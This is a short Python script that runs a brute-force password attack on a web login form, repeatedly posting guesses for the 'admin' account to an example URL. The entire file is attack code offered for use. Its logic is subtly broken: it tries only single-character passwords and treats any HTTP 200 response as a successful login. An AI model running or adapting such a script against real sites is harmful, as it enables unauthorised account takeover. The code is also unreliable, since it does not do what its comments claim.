import requests
import string

# Set up the URL to test
url = "http://example.com/login"

# Define the credentials to test
username = "admin"
passwords = string.ascii_letters + string.digits

# Perform the brute force attack
for password in passwords:
    login_data = {
        "username": username,
        "password": password
    }
    response = requests.post(url, data=login_data)
    if response.status_code == 200:
        print(f"Success! The password is: {password}")
        break

# If the loop completes without finding a valid password, print a failure message
else:
    print("Failed to find a valid password!")
